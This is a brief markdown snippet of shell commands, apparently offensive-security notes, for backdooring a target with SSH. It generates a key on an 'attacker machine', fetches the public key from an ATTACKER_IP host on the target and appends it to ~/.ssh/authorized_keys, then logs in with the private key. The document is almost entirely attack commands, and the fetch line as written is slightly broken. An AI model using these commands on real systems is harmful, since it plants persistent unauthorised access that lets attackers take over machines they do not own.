### Shell Commands

**On Attacker machine:**
```bash
ssh-keygen -t rsa

```
*remove the user@kali from the end of pulic key so that we can login into current user tty session*


**On Target machine:**
```bash
echo $(wget https://ATTACKER_IP/.ssh/id_rsa.pub) >> ~/.ssh/authorized_keys
```

**On Attacker machine:**
```bash
ssh -i id_rsa user@Target
```